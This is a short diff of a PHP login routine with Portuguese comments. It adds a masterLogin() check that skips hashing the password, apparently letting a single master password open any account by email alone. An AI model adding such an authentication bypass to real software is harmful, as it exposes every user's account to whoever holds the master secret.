@@ -974,7 +974,10 @@
 						/* senão, fazer a comparação do email com a senha encriptada com sha512 */
 						$pes = new pessoa();
 						$pes->email = dboescape($_POST['email']);
-						$pes->pass = hash('sha512', dboescape($_POST['pass']));
+						if(!masterLogin(dboescape($_POST['pass'])))
+						{
+							$pes->pass = hash('sha512', dboescape($_POST['pass']));
+						}
 						if($pes->hasInativo()) /* checando se a tabela pessoa tem o campo inativo */
 						{
 							$pes->inativo = 0;
